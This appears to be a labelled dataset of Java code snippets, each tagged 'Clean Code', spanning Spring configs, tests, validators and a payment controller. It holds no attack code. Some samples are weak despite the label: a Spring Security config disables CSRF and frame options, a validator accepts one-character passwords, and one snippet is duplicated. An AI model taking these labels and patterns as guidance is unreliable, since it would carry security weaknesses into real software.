          for (int j=0; j < entries.size(); j++) {
            ResEntry entry=entries.get(j);
            System.out.println(String.format(""        resource 0x%08x %-20s: %s"",resPrefix | entry.spec.id,entry.spec.name,entry.value));
          }
        }
      }
    }
  }
  public static void main(  String... args) throws IOException {
    if (args.length == 0) {
      System.err.println(""asrc-dump file.arsc"");
      return;
    }
    byte[] data=Util.readFile(new File(args[0]));
    List<Pkg> pkgs=new ArscParser(data).parse();
    dump(pkgs);
  }
}
",0,Clean Code
"class JenkinsAutoConfigurerTest {
  @Test void shouldReturnOptionalEmptyIfNotJenkins(){
    System2 system2=mock();
    BranchConfigurationFactory branchConfigurationFactory=mock();
    ProjectBranches projectBranches=mock();
    JenkinsAutoConfigurer underTest=new JenkinsAutoConfigurer(branchConfigurationFactory);
    assertThat(underTest.detectConfiguration(system2,projectBranches)).isEmpty();
  }
  @Test void shouldReturnBranchConfigurationBasedOnNoPrIdInEnvironmentParameters(){
    System2 system2=mock();
    when(system2.envVariable(""JENKINS_HOME"")).thenReturn(""/path/to/home"");
    when(system2.envVariable(""BRANCH_NAME"")).thenReturn(""branch"");
    BranchConfigurationFactory branchConfigurationFactory=mock();
    BranchConfiguration branchConfiguration=mock();
    when(branchConfigurationFactory.createBranchConfiguration(any(),any())).thenReturn(branchConfiguration);
    ProjectBranches projectBranches=mock();
    JenkinsAutoConfigurer underTest=new JenkinsAutoConfigurer(branchConfigurationFactory);
    assertThat(underTest.detectConfiguration(system2,projectBranches)).contains(branchConfiguration);
    verify(branchConfigurationFactory).createBranchConfiguration(""branch"",projectBranches);
  }
  @Test void shouldReturnPullRequestConfigurationBasedOnPrIdInEnvironmentParameters(){
    System2 system2=mock();
    when(system2.envVariable(""JENKINS_HOME"")).thenReturn(""/path/to/home"");
    when(system2.envVariable(""CHANGE_BRANCH"")).thenReturn(""source"");
    when(system2.envVariable(""CHANGE_ID"")).thenReturn(""id"");
    when(system2.envVariable(""CHANGE_TARGET"")).thenReturn(""target"");
    BranchConfigurationFactory branchConfigurationFactory=mock();
    BranchConfiguration branchConfiguration=mock();
    when(branchConfigurationFactory.createPullRequestConfiguration(any(),any(),any(),any())).thenReturn(branchConfiguration);
    ProjectBranches projectBranches=mock();
    JenkinsAutoConfigurer underTest=new JenkinsAutoConfigurer(branchConfigurationFactory);
    assertThat(underTest.detectConfiguration(system2,projectBranches)).contains(branchConfiguration);
    verify(branchConfigurationFactory).createPullRequestConfiguration(""id"",""source"",""target"",projectBranches);
  }
}
",0,Clean Code
"/** 
 * Represents the boolean AND operation.
 * @author Andy Clement
 * @author Mark Fisher
 * @author Oliver Becker
 * @since 3.0
 */
class OpAnd extends Operator {
  public OpAnd(  int pos,  SpelNodeImpl... operands){
    super(""and"",pos,operands);
    this.exitTypeDescriptor=""Z"";
  }
  @Override public TypedValue getValueInternal(  ExpressionState state) throws EvaluationException {
    if (getBooleanValue(state,getLeftOperand()) == false) {
      return BooleanTypedValue.FALSE;
    }
    return BooleanTypedValue.forValue(getBooleanValue(state,getRightOperand()));
  }
  private boolean getBooleanValue(  ExpressionState state,  SpelNodeImpl operand){
    try {
      Boolean value=operand.getValue(state,Boolean.class);
      assertValueNotNull(value);
      return value;
    }
 catch (    SpelEvaluationException ex) {
      ex.setPosition(operand.getStartPosition());
      throw ex;
    }
  }
  private void assertValueNotNull(  Boolean value){
    if (value == null) {
      throw new SpelEvaluationException(SpelMessage.TYPE_CONVERSION_ERROR,""null"",""boolean"");
    }
  }
  @Override public boolean isCompilable(){
    SpelNodeImpl left=getLeftOperand();
    SpelNodeImpl right=getRightOperand();
    return (left.isCompilable() && right.isCompilable() && CodeFlow.isBooleanCompatible(left.exitTypeDescriptor)&& CodeFlow.isBooleanCompatible(right.exitTypeDescriptor));
  }
  @Override public void generateCode(  MethodVisitor mv,  CodeFlow cf){
    Label elseTarget=new Label();
    Label endOfIf=new Label();
    cf.enterCompilationScope();
    getLeftOperand().generateCode(mv,cf);
    cf.unboxBooleanIfNecessary(mv);
    cf.exitCompilationScope();
    mv.visitJumpInsn(IFNE,elseTarget);
    mv.visitLdcInsn(0);
    mv.visitJumpInsn(GOTO,endOfIf);
    mv.visitLabel(elseTarget);
    cf.enterCompilationScope();
    getRightOperand().generateCode(mv,cf);
    cf.unboxBooleanIfNecessary(mv);
    cf.exitCompilationScope();
    mv.visitLabel(endOfIf);
    cf.pushDescriptor(this.exitTypeDescriptor);
  }
}
",0,Clean Code
"/** 
 * Represents a World on the Server.<br> This is usually one of the dimensions of a level.<br> <br> <i>The implementation of this class has to be thread-save!</i><br>
 */
public interface World {
  String getId();
  String getName();
  Vector3i getSpawnPoint();
  DimensionType getDimensionType();
  Grid getChunkGrid();
  Grid getRegionGrid();
  /** 
 * Returns the  {@link Chunk} on the specified block-position
 */
  Chunk getChunkAtBlock(  int x,  int z);
  /** 
 * Returns the  {@link Chunk} on the specified chunk-position
 */
  Chunk getChunk(  int x,  int z);
  /** 
 * Returns the  {@link Region} on the specified region-position
 */
  Region<Chunk> getRegion(  int x,  int z);
  /** 
 * Returns a collection of all regions in this world. <i>(Be aware that the collection is not cached and recollected each time from the world-files!)</i>
 */
  Collection<Vector2i> listRegions();
  /** 
 * Creates and returns a new  {@link WatchService} which watches for any changes in this worlds regions.
 * @throws IOException if an IOException occurred while creating the watch-service
 * @throws UnsupportedOperationException if watching this world is not supported
 */
  default WatchService<Vector2i> createRegionWatchService() throws IOException {
    throw new UnsupportedOperationException();
  }
  /** 
 * Loads all chunks from the specified region into the chunk cache (if there is a cache)
 */
  default void preloadRegionChunks(  int x,  int z){
    preloadRegionChunks(x,z,pos -> true);
  }
  /** 
 * Loads the filtered chunks from the specified region into the chunk cache (if there is a cache)
 */
  void preloadRegionChunks(  int x,  int z,  Predicate<Vector2i> chunkFilter);
  /** 
 * Invalidates the complete chunk cache (if there is a cache), so that every chunk has to be reloaded from disk
 */
  void invalidateChunkCache();
  /** 
 * Invalidates the chunk from the chunk-cache (if there is a cache), so that the chunk has to be reloaded from disk
 */
  void invalidateChunkCache(  int x,  int z);
  void iterateEntities(  int minX,  int minZ,  int maxX,  int maxZ,  Consumer<Entity> entityConsumer);
  /** 
 * Generates a unique world-id based on a world-folder and a dimension
 */
  static String id(  Path worldFolder,  Key dimension){
    worldFolder=worldFolder.toAbsolutePath().normalize();
    Path workingDir=Path.of("""").toAbsolutePath().normalize();
    if (worldFolder.startsWith(workingDir))     worldFolder=workingDir.relativize(worldFolder);
    return worldFolder + ""#"" + dimension.getFormatted();
  }
}
",0,Clean Code
"@Configuration public class SpringDocConfiguration {
@SpringBootApplication static class SpringDocTestApp {
  }
  @Bean public GroupedOpenApi storeOpenApi(){
    return GroupedOpenApi.builder().group(""stores"").pathsToMatch(""/store/**"").build();
  }
  @Bean public GroupedOpenApi userOpenApi(){
    return GroupedOpenApi.builder().group(""users"").packagesToScan(""test.org.springdoc.api.v30.app68.api.user"").addOpenApiCustomizer(serverOpenApiCustomizer1()).addOperationCustomizer(operationCustomizer()).build();
  }
  public OpenApiCustomizer serverOpenApiCustomizer1(){
    Server server=new Server().url(""http://toto.v1.com"").description(""myserver1"");
    List<Server> servers=new ArrayList<>();
    servers.add(server);
    return openApi -> openApi.setServers(servers);
  }
  public OpenApiCustomizer serverOpenApiCustomizer2(){
    Server server=new Server().url(""http://toto.v2.com"").description(""myserver2"");
    List<Server> servers=new ArrayList<>();
    servers.add(server);
    return openApi -> openApi.setServers(servers);
  }
  OperationCustomizer operationCustomizer(){
    return (    Operation operation,    HandlerMethod handlerMethod) -> {
      CustomizedOperation annotation=handlerMethod.getMethodAnnotation(CustomizedOperation.class);
      if (annotation != null) {
        operation.description(StringUtils.defaultIfBlank(operation.getDescription(),Constants.DEFAULT_DESCRIPTION) + "", "" + annotation.addition());
      }
      return operation;
    }
;
  }
  @Bean public GroupedOpenApi petOpenApi(){
    return GroupedOpenApi.builder().group(""pets"").pathsToMatch(""/pet/**"").addOpenApiCustomizer(serverOpenApiCustomizer2()).build();
  }
  @Bean public GroupedOpenApi groupOpenApi(){
    return GroupedOpenApi.builder().group(""groups test"").pathsToMatch(""/v1/**"").pathsToExclude(""/v1/users"").packagesToScan(""test.org.springdoc.api.v30.app68.api.user"",""test.org.springdoc.api.v30.app68.api.store"").build();
  }
  @Bean public OpenAPI customOpenAPI(){
    return new OpenAPI().components(new Components().addSecuritySchemes(""basicScheme"",new SecurityScheme().type(SecurityScheme.Type.HTTP).scheme(""basic""))).info(new Info().title(""Petstore API"").version(""v0"").description(""This is a sample server Petstore server.  You can find out more about     Swagger at [http://swagger.io](http://swagger.io) or on [irc.freenode.net, #swagger](http://swagger.io/irc/).      For this sample, you can use the api key `special-key` to test the authorization     filters."").termsOfService(""http://swagger.io/terms/"").license(new License().name(""Apache 2.0"").url(""http://springdoc.org"")));
  }
}
",0,Clean Code
"/** 
 * UserRegister2Validation for validate  {@link org.b3log.symphony.processor.LoginProcessor} register2(Type POST) method.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.0, Feb 11, 2020
 * @since 1.3.0
 */
@Singleton public class UserRegister2ValidationMidware {
  /** 
 * Language service.
 */
  @Inject private LangPropsService langPropsService;
  /** 
 * Option query service.
 */
  @Inject private OptionQueryService optionQueryService;
  /** 
 * Max password length. <p> MD5 32 </p>
 */
  private static final int MAX_PWD_LENGTH=32;
  /** 
 * Min password length.
 */
  private static final int MIN_PWD_LENGTH=1;
  public void handle(  final RequestContext context){
    final JSONObject requestJSONObject=context.requestJSON();
    final JSONObject option=optionQueryService.getOption(Option.ID_C_MISC_ALLOW_REGISTER);
    if (""1"".equals(option.optString(Option.OPTION_VALUE))) {
      context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""notAllowRegisterLabel"")));
      context.abort();
      return;
    }
    final int appRole=requestJSONObject.optInt(UserExt.USER_APP_ROLE);
    final String password=requestJSONObject.optString(User.USER_PASSWORD);
    if (UserExt.USER_APP_ROLE_C_HACKER != appRole && UserExt.USER_APP_ROLE_C_PAINTER != appRole) {
      context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""registerFailLabel"") + "" - "" + langPropsService.get(""invalidAppRoleLabel"")));
      context.abort();
      return;
    }
    if (invalidUserPassword(password)) {
      context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""registerFailLabel"") + "" - "" + langPropsService.get(""invalidPasswordLabel"")));
      context.abort();
      return;
    }
    context.handle();
  }
  /** 
 * Checks password, length [1, 16].
 * @param password the specific password
 * @return {@code true} if it is invalid, returns {@code false} otherwise
 */
  public static boolean invalidUserPassword(  final String password){
    return password.length() < MIN_PWD_LENGTH || password.length() > MAX_PWD_LENGTH;
  }
}
",0,Clean Code
"/** 
 * Find Spring test Classes, which means classes annotated or meta-annotated with {@code @ExtendWith(SpringExtension.class)}.
 * @author Brian Clozel
 */
public abstract class TestClassesFinder {
  public static final String EXTEND_WITH_ANNOTATION_NAME=""org.junit.jupiter.api.extension.ExtendWith"";
  public static final String SPRING_EXTENSION_ANNOTATION_NAME=""org.springframework.test.context.junit.jupiter.SpringExtension"";
  private static final FileFilter CLASS_FILE_FILTER=TestClassesFinder::isClassFile;
  private static final FileFilter PACKAGE_DIRECTORY_FILTER=TestClassesFinder::isPackageDirectory;
  public static List<String> findTestClasses(  Path rootDirectoryPath) throws IOException {
    List<String> testClasses=new ArrayList<>();
    SimpleMetadataReaderFactory metadataReaderFactory=new SimpleMetadataReaderFactory();
    File rootDirectory=rootDirectoryPath.toFile();
    if (!rootDirectory.exists()) {
      return Collections.emptyList();
    }
 else     if (!rootDirectory.isDirectory()) {
      throw new IllegalArgumentException(""Invalid root directory '"" + rootDirectory + ""'"");
    }
 else {
      Deque<File> stack=new ArrayDeque<>();
      stack.push(rootDirectory);
      while (!stack.isEmpty()) {
        File file=stack.pop();
        if (file.isFile()) {
          try {
            MetadataReader metadataReader=metadataReaderFactory.getMetadataReader(new FileSystemResource(file));
            AnnotationMetadata annotationMetadata=metadataReader.getAnnotationMetadata();
            ClassMetadata classMetadata=metadataReader.getClassMetadata();
            MultiValueMap<String,Object> extendWith=annotationMetadata.getAllAnnotationAttributes(EXTEND_WITH_ANNOTATION_NAME,true);
            if (extendWith != null) {
              List<Object> extendWithValues=extendWith.getOrDefault(""value"",Collections.emptyList());
              boolean isSpringTest=extendWithValues.stream().flatMap(classNames -> Arrays.stream((String[])classNames)).anyMatch(className -> className.equals(SPRING_EXTENSION_ANNOTATION_NAME));
              if (isSpringTest) {
                testClasses.add(classMetadata.getClassName());
              }
            }
          }
 catch (          IOException ex) {
          }
        }
        if (file.isDirectory()) {
          Arrays.stream(file.listFiles(PACKAGE_DIRECTORY_FILTER)).forEach(stack::push);
          Arrays.stream(file.listFiles(CLASS_FILE_FILTER)).forEach(stack::push);
        }
      }
    }
    return Collections.unmodifiableList(testClasses);
  }
  private static boolean isClassFile(  File file){
    return file.isFile() && file.getName().endsWith("".class"");
  }
  private static boolean isPackageDirectory(  File file){
    return file.isDirectory() && !file.getName().startsWith(""."");
  }
}
",0,Clean Code
"/** 
 * Created by qiaoruikai on 2018/10/16 2:04 AM.
 */
public class BatchStepProvider extends AbstractStepProvider {
  private static final String TAG=""BatchStepProvider"";
  private List<RecordCaseInfo> mRecordCases;
  private int currentCaseIdx;
  private OperationStep prepareStep;
  private boolean restart;
  OperationStepProvider currentStepProvider;
  List<ReplayResultBean> resultBeans;
  @Override public void prepare(){
    loadProvider(currentCaseIdx);
  }
  public BatchStepProvider(  List<RecordCaseInfo> recordCaseInfos,  boolean restart){
    mRecordCases=recordCaseInfos;
    currentCaseIdx=0;
    this.restart=restart;
    resultBeans=new ArrayList<>(recordCaseInfos.size() + 1);
  }
  /** 
 * 加载Provider
 * @param startPos
 */
  private void loadProvider(  int startPos){
    int pos=startPos;
    RecordCaseInfo currentCase=null;
    currentStepProvider=null;
    while (pos < mRecordCases.size() && (currentCase=mRecordCases.get(pos)) == null) {
      pos++;
    }
    currentCaseIdx=pos;
    if (currentCase == null) {
      return;
    }
    currentStepProvider=new OperationStepProvider(currentCase);
    if (restart) {
      prepareStep=new OperationStep();
      prepareStep.setOperationMethod(new OperationMethod(PerformActionEnum.GOTO_INDEX));
    }
    currentStepProvider.prepare();
  }
  @Override public OperationStep provideStep(){
    if (!currentStepProvider.hasNext()) {
      if (currentCaseIdx >= mRecordCases.size() - 1) {
        return null;
      }
 else {
        resultBeans.addAll(currentStepProvider.genReplayResult());
        loadProvider(currentCaseIdx + 1);
      }
    }
    if (prepareStep != null) {
      OperationStep step=prepareStep;
      prepareStep=null;
      return step;
    }
    return currentStepProvider == null ? null : currentStepProvider.provideStep();
  }
  @Override public boolean hasNext(){
    return (currentStepProvider != null && currentStepProvider.hasNext()) || (currentCaseIdx < mRecordCases.size() - 1);
  }
  @Override public boolean reportErrorStep(  OperationStep step,  String reason,  List<String> stack){
    boolean errorResult=currentStepProvider.reportErrorStep(step,reason,stack);
    if (errorResult) {
      resultBeans.addAll(currentStepProvider.genReplayResult());
      loadProvider(currentCaseIdx + 1);
    }
    return false;
  }
  @Override public void onStepInfo(  ReplayStepInfoBean bean){
    currentStepProvider.onStepInfo(bean);
  }
  @Override public List<ReplayResultBean> genReplayResult(){
    if (currentStepProvider != null) {
      resultBeans.addAll(currentStepProvider.genReplayResult());
      currentStepProvider=null;
    }
    return resultBeans;
  }
}",0,Clean Code
"/** 
 * @author traff
 */
public class TerminalTabsImpl implements AbstractTabs<JediTermWidget> {
  protected JTabbedPane myTabbedPane=new JTabbedPane();
  @Override public int getTabCount(){
    return myTabbedPane.getTabCount();
  }
  @Override public void addTab(  String name,  JediTermWidget terminal){
    myTabbedPane.addTab(name,terminal);
  }
  @Override public String getTitleAt(  int index){
    return myTabbedPane.getTitleAt(index);
  }
  @Override public int getSelectedIndex(){
    return myTabbedPane.getSelectedIndex();
  }
  @Override public void setSelectedIndex(  int index){
    myTabbedPane.setSelectedIndex(index);
  }
  @Override public void setTabComponentAt(  int index,  Component component){
    myTabbedPane.setTabComponentAt(index,component);
  }
  @Override public int indexOfComponent(  Component component){
    return myTabbedPane.indexOfComponent(component);
  }
  @Override public int indexOfTabComponent(  Component component){
    return myTabbedPane.indexOfTabComponent(component);
  }
  @Override public void removeAll(){
    myTabbedPane.removeAll();
  }
  @Override public void remove(  JediTermWidget terminal){
    myTabbedPane.remove(terminal);
  }
  @Override public void setTitleAt(  int index,  String name){
    myTabbedPane.setTitleAt(index,name);
  }
  @Override public void setSelectedComponent(  JediTermWidget terminal){
    myTabbedPane.setSelectedComponent(terminal);
  }
  @Override public JComponent getComponent(){
    return myTabbedPane;
  }
  @Override public JediTermWidget getComponentAt(  int index){
    return (JediTermWidget)myTabbedPane.getComponentAt(index);
  }
  @Override public void addChangeListener(  final TabChangeListener listener){
    myTabbedPane.addChangeListener(new ChangeListener(){
      @Override public void stateChanged(      ChangeEvent e){
        listener.selectionChanged();
      }
    }
);
    myTabbedPane.addContainerListener(new ContainerListener(){
      @Override public void componentAdded(      ContainerEvent e){
      }
      @Override public void componentRemoved(      ContainerEvent e){
        if (e.getSource() == myTabbedPane) {
          listener.tabRemoved();
        }
      }
    }
);
  }
}
",0,Clean Code
"@EnableWebSecurity public class SecurityConfig extends WebSecurityConfigurerAdapter {
  @Autowired private CaptchaFilterConfig captchaFilterConfig;
  @Autowired private UserDetailsServiceImpl userDetailsServiceImpl;
  @Autowired private PasswordConfig passwordConfig;
  @Autowired private LoginFailureHandlerConfig loginFailureHandlerConfig;
  @Autowired private LoginSuccessHandlerConfig loginSuccessHandlerConfig;
  @Autowired private LogoutHandlerConfig logoutHandlerConfig;
  @Autowired private SysAuthorityService sysAuthorityService;
  @Autowired private MyFilterInvocationSecurityMetadataSource myFilterInvocationSecurityMetadataSource;
  @Autowired private DataSource dataSource;
  public static final String[] MATCHERS_PERMITALL_URL={""/login"",""/logout"",""/loginPage"",""/favicon.ico"",""/common/**"",""/webjars/**"",""/getVerifyCodeImage"",""/openApi/*""};
  @Override protected void configure(  AuthenticationManagerBuilder auth) throws Exception {
    auth.userDetailsService(userDetailsServiceImpl).passwordEncoder(passwordConfig);
  }
  @Override protected void configure(  HttpSecurity http) throws Exception {
    http.csrf().disable().headers().frameOptions().disable().and();
    http.cors();
    http.addFilterBefore(captchaFilterConfig,UsernamePasswordAuthenticationFilter.class).formLogin().loginProcessingUrl(""/login"").loginPage(""/loginPage"").failureHandler(loginFailureHandlerConfig).successHandler(loginSuccessHandlerConfig).permitAll().and();
    http.logout().addLogoutHandler(logoutHandlerConfig).logoutUrl(""/logout"").logoutSuccessUrl(""/loginPage"").permitAll().and();
    http.addFilterAfter(dynamicallyUrlInterceptor(),FilterSecurityInterceptor.class).authorizeRequests().antMatchers(MATCHERS_PERMITALL_URL).permitAll().anyRequest().authenticated().and();
    http.rememberMe().tokenValiditySeconds(604800).tokenRepository(persistentTokenRepository()).userDetailsService(userDetailsServiceImpl).rememberMeServices(myPersistentTokenBasedRememberMeServices()).and();
  }
  @Bean public PersistentTokenRepository persistentTokenRepository(){
    JdbcTokenRepositoryImpl persistentTokenRepository=new JdbcTokenRepositoryImpl();
    persistentTokenRepository.setDataSource(dataSource);
    return persistentTokenRepository;
  }
  @Bean() public MyPersistentTokenBasedRememberMeServices myPersistentTokenBasedRememberMeServices(){
    MyPersistentTokenBasedRememberMeServices rememberMeServices=new MyPersistentTokenBasedRememberMeServices(UUIDUtil.getUuid(),userDetailsServiceImpl,persistentTokenRepository());
    rememberMeServices.setAlwaysRemember(true);
    return rememberMeServices;
  }
  @Bean public DynamicallyUrlInterceptor dynamicallyUrlInterceptor(){
    myFilterInvocationSecurityMetadataSource.setRequestMap(sysAuthorityService.list(new SysAuthorityVo()).getData());
    DynamicallyUrlInterceptor interceptor=new DynamicallyUrlInterceptor();
    interceptor.setSecurityMetadataSource(myFilterInvocationSecurityMetadataSource);
    List<AccessDecisionVoter<?>> decisionVoters=new ArrayList<>(1);
    decisionVoters.add(new RoleVoter());
    interceptor.setAccessDecisionManager(new MyAccessDecisionManager(decisionVoters));
    return interceptor;
  }
  @Bean SessionRegistry sessionRegistry(){
    return new SessionRegistryImpl();
  }
}
",0,Clean Code
"public abstract static class RikkaConfigItem implements View.OnClickListener {
  final protected RikkaDialog rikkaDialog;
  public View view;
  public RikkaConfigItem(  RikkaDialog d){
    rikkaDialog=d;
  }
  public static RikkaConfigItem create(  RikkaDialog dialog,  final String name,  final BaseDelayableHook hook){
    return new RikkaConfigItem(dialog){
      @Override public void onClick(      final View v){
        hook.setEnabled(!hook.isEnabled());
        if (hook.isEnabled() && !hook.isInited()) {
          new Thread(new Runnable(){
            @Override public void run(){
              ViewBuilder.doSetupAndInit(v.getContext(),hook);
              v.post(new Runnable(){
                @Override public void run(){
                  invalidateStatus();
                }
              }
);
            }
          }
).start();
        }
 else {
          invalidateStatus();
        }
      }
      @Override public boolean isEnabled(){
        return hook.isEnabled();
      }
      @Override public String getName(){
        return name;
      }
    }
;
  }
  public static RikkaConfigItem createDummy(  RikkaDialog dialog,  final String name){
    return new RikkaConfigItem(dialog){
      boolean on;
      @Override public void onClick(      View v){
        on=!on;
        invalidateStatus();
      }
      @Override public boolean isEnabled(){
        return on;
      }
      @Override public String getName(){
        return name;
      }
    }
;
  }
  public static RikkaConfigItem createStub(  RikkaDialog dialog,  final String name){
    return new RikkaConfigItem(dialog){
      @Override public void onClick(      View v){
        Toasts.info(v.getContext(),""对不起,此功能尚在开发中"");
      }
      @Override public boolean isEnabled(){
        return false;
      }
      @Override public String getName(){
        return name;
      }
    }
;
  }
  public abstract boolean isEnabled();
  public abstract String getName();
  public void invalidateStatus(){
    View v=view;
    if (v == null) {
      return;
    }
    ViewCompat.setBackground(v,isEnabled() ? rikkaDialog.itemOnDrawable : rikkaDialog.itemOffDrawable);
  }
}
",0,Clean Code
"/** 
 * Sitemap processor.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.1, Apr 8, 2020
 * @since 1.6.0
 */
@Singleton public class SitemapProcessor {
  /** 
 * Logger.
 */
  private static final Logger LOGGER=LogManager.getLogger(SitemapProcessor.class);
  /** 
 * Sitemap query service.
 */
  @Inject private SitemapQueryService sitemapQueryService;
  /** 
 * Returns the sitemap.
 * @param context the specified context
 */
  public void sitemap(  final RequestContext context){
    final TextXmlRenderer renderer=new TextXmlRenderer();
    context.setRenderer(renderer);
    final Sitemap sitemap=new Sitemap();
    LOGGER.log(Level.DEBUG,""Generating sitemap...."");
    sitemapQueryService.genIndex(sitemap);
    sitemapQueryService.genDomains(sitemap);
    final String content=sitemap.toString();
    LOGGER.log(Level.DEBUG,""Generated sitemap"");
    renderer.setContent(content);
  }
}
",0,Clean Code
"/** 
 * 腾讯课堂搜索【咕泡学院】 官网：www.gupaoedu.com 风骚的Mic 老师 create-date: 2019/8/1-下午5:27
 */
@Slf4j @RestController @RequestMapping(""/cashier"") public class PayController {
  @Reference(timeout=3000,retries=0) PayCoreService payCoreService;
  @PostMapping(""/pay"") @Anoymous public ResponseData pay(  @RequestBody PayForm payForm,  HttpServletRequest httpServletRequest){
    log.info(""支付表单数据:{}"",payForm);
    PaymentRequest request=new PaymentRequest();
    String userInfo=(String)httpServletRequest.getAttribute(TokenIntercepter.USER_INFO_KEY);
    JSONObject object=JSON.parseObject(userInfo);
    Long uid=Long.parseLong(object.get(""uid"").toString());
    request.setUserId(uid);
    BigDecimal money=payForm.getMoney();
    request.setOrderFee(money);
    request.setPayChannel(payForm.getPayType());
    request.setSubject(payForm.getInfo());
    request.setSpbillCreateIp(""115.195.125.164"");
    request.setTradeNo(payForm.getOrderId());
    request.setTotalFee(money);
    PaymentResponse response=payCoreService.execPay(request);
    if (response.getCode().equals(PayReturnCodeEnum.SUCCESS.getCode())) {
      return new ResponseUtil<>().setData(response.getHtmlStr());
    }
    return new ResponseUtil<>().setErrorMsg(response.getMsg());
  }
  @PostMapping(""/refund"") @Anoymous public ResponseData refund(  @RequestBody PayForm refundForm,  HttpServletRequest httpServletRequest){
    log.info(""订单退款入参:{}"",JSON.toJSONString(refundForm));
    RefundRequest refundRequest=new RefundRequest();
    String userInfo=(String)httpServletRequest.getAttribute(TokenIntercepter.USER_INFO_KEY);
    JSONObject object=JSON.parseObject(userInfo);
    Long uid=Long.parseLong(object.get(""uid"").toString());
    refundRequest.setUserId(uid);
    refundRequest.setOrderId(refundForm.getOrderId());
    refundRequest.setRefundAmount(refundForm.getMoney());
    refundRequest.setPayChannel(refundForm.getPayType());
    RefundResponse refundResponse=payCoreService.execRefund(refundRequest);
    log.info(""订单退款同步返回结果:{}"",JSON.toJSONString(refundResponse));
    return new ResponseUtil<>().setData(refundResponse);
  }
}",0,Clean Code
"/** 
 * u2 line_number_table_length; {  u2 start_pc; u2 line_number; } line_number_table[line_number_table_length]; <p> Created by Egor on 05.10.2014.
 */
public class StructLineNumberTableAttribute extends StructGeneralAttribute {
  private int[] myLineInfo=InterpreterUtil.EMPTY_INT_ARRAY;
  @Override public void initContent(  DataInputFullStream data,  ConstantPool pool) throws IOException {
    int len=data.readUnsignedShort() * 2;
    if (len > 0) {
      myLineInfo=new int[len];
      for (int i=0; i < len; i+=2) {
        myLineInfo[i]=data.readUnsignedShort();
        myLineInfo[i + 1]=data.readUnsignedShort();
      }
    }
 else     if (myLineInfo.length > 0) {
      myLineInfo=InterpreterUtil.EMPTY_INT_ARRAY;
    }
  }
  public int findLineNumber(  int pc){
    if (myLineInfo.length >= 2) {
      for (int i=myLineInfo.length - 2; i >= 0; i-=2) {
        if (pc >= myLineInfo[i]) {
          return myLineInfo[i + 1];
        }
      }
    }
    return -1;
  }
  public int[] getRawData(){
    return myLineInfo;
  }
}
",0,Clean Code
"/** 
 * 商品
 * @Author 1024创新实验室: 胡克
 * @Date 2021-10-25 20:26:54
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
@Mapper @Component public interface GoodsDao extends BaseMapper<GoodsEntity> {
  /** 
 * 分页 查询商品
 */
  List<GoodsVO> query(  Page page,  @Param(""query"") GoodsQueryForm query);
  /** 
 * 批量更新删除状态
 */
  void batchUpdateDeleted(  @Param(""goodsIdList"") List<Long> goodsIdList,  @Param(""deletedFlag"") Boolean deletedFlag);
}
/** 
 * 商品
 * @Author 1024创新实验室: 胡克
 * @Date 2021-10-25 20:26:54
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
@Mapper @Component public interface GoodsDao extends BaseMapper<GoodsEntity> {
  /** 
 * 分页 查询商品
 */
  List<GoodsVO> query(  Page page,  @Param(""query"") GoodsQueryForm query);
  /** 
 * 批量更新删除状态
 */
  void batchUpdateDeleted(  @Param(""goodsIdList"") List<Long> goodsIdList,  @Param(""deletedFlag"") Boolean deletedFlag);
}
",0,Clean Code
"@Route(APIPath.Create_Channel) @HttpMethod(""POST"") public class CreateChannelAction extends AdminAction {
  @Override public boolean isTransactionAction(){
    return true;
  }
  @Override public boolean action(  Request request,  Response response){
    if (request.getNettyRequest() instanceof FullHttpRequest) {
      InputCreateChannel inputCreateChannel=getRequestBody(request.getNettyRequest(),InputCreateChannel.class);
      if (inputCreateChannel != null && !StringUtil.isNullOrEmpty(inputCreateChannel.getName()) && !StringUtil.isNullOrEmpty(inputCreateChannel.getOwner())) {
        if (StringUtil.isNullOrEmpty(inputCreateChannel.getTargetId())) {
          inputCreateChannel.setTargetId(messagesStore.getShortUUID());
        }
        sendApiMessage(response,inputCreateChannel.getOwner(),IMTopic.CreateChannelTopic,inputCreateChannel.toProtoChannelInfo().toByteArray(),result -> {
          ByteBuf byteBuf=Unpooled.buffer();
          byteBuf.writeBytes(result);
          ErrorCode errorCode=ErrorCode.fromCode(byteBuf.readByte());
          if (errorCode == ErrorCode.ERROR_CODE_SUCCESS) {
            byte[] data=new byte[byteBuf.readableBytes()];
            byteBuf.readBytes(data);
            String channelId=new String(data);
            return new Result(ErrorCode.ERROR_CODE_SUCCESS,new OutputCreateChannel(channelId));
          }
 else {
            return new Result(errorCode);
          }
        }
);
        return false;
      }
 else {
        setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
      }
    }
    return true;
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public class AdjustableSemaphoreTest {
  @Test public void updateMaxPermitsTest(){
    final AdjustableSemaphore semaphore=new AdjustableSemaphore(5);
    Assert.assertEquals(5,semaphore.availablePermits());
    Assert.assertEquals(5,semaphore.getMaxPermits());
    for (int i=0; i < 5; i++) {
      Assert.assertTrue(semaphore.tryAcquire());
    }
    Assert.assertFalse(semaphore.tryAcquire());
    Assert.assertEquals(0,semaphore.availablePermits());
    Assert.assertEquals(5,semaphore.getMaxPermits());
    for (int i=0; i < 5; i++) {
      semaphore.release();
    }
    Assert.assertEquals(5,semaphore.availablePermits());
    semaphore.setMaxPermits(2);
    Assert.assertEquals(2,semaphore.getMaxPermits());
    Assert.assertEquals(2,semaphore.availablePermits());
    for (int i=0; i < 2; i++) {
      Assert.assertTrue(semaphore.tryAcquire());
    }
    Assert.assertFalse(semaphore.tryAcquire());
    Assert.assertEquals(0,semaphore.availablePermits());
    Assert.assertEquals(2,semaphore.getMaxPermits());
    for (int i=0; i < 2; i++) {
      semaphore.release();
    }
    semaphore.setMaxPermits(10);
    Assert.assertEquals(10,semaphore.getMaxPermits());
    Assert.assertEquals(10,semaphore.availablePermits());
    for (int i=0; i < 10; i++) {
      Assert.assertTrue(semaphore.tryAcquire());
    }
    Assert.assertFalse(semaphore.tryAcquire());
    Assert.assertEquals(0,semaphore.availablePermits());
